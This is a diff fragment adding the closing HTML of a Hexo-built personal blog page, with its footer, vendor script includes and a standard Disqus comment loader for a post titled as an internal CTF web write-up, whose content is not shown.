+            <i class="fa fa-angle-double-down"></i>
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xuefeng</span>
+</div>
+
+<div class="powered-by">
+  基于 <a class="theme-link" href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a> 高效框架构建
+</div>
+
+<div class="theme-info">
+  外套 -
+  <a class="theme-link" href="https://www.xuefeng.space/">
+    NexT.Mist.XueFeng
+  </a>
+</div>
+
+<div class="icp-lisence">
+  <a class="theme-link" href="https://beian.miit.gov.cn/" target="_blank" rel="external nofollow noopener noreferrer">
+    湘ICP备19020423号-1
+  </a>
+</div>
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+
+  
+
+
+
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=0.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=0.5.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=0.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=0.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=0.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'snow-hunnu';
+      var disqus_identifier = '2022/07/04/ProjectQingyunStageBCtfWriteupWebSection/';
+      var disqus_title = '单位内部CTF-Web部分WriteUp';
+      var disqus_url = 'https://www.xuefeng.space/2022/07/04/ProjectQingyunStageBCtfWriteupWebSection/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+  
+  
+  
+
+  
+
+  
+
+</body>
+</html>
